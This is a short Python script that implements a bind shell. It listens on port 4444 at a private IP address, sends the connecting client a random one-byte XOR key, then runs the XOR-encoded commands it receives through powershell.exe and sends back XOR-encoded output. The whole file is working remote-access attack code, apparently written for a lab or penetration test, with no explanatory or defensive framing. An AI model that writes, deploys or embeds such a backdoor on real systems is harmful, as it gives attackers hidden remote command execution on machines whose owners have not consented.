import socket,subprocess,os
def e(d,k):
    ed=b"";i=0
    while i<len(d):ed+=bytes([ord(chr(d[i]))^ord(chr(k[i%len(k)]))]);i+=1
    return ed
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("172.16.110.130",4444))
s.listen(1)
c,a=s.accept()
k=os.urandom(1)
c.send(k)
while True:
    p=subprocess.Popen("powershell.exe",stdin=subprocess.PIPE,stdout=subprocess.PIPE)
    cmmd=c.recv(1024)
    out=p.communicate(e(cmmd,k).decode().encode())[0]
    c.send(e(out,k))
c.close()
s.close()
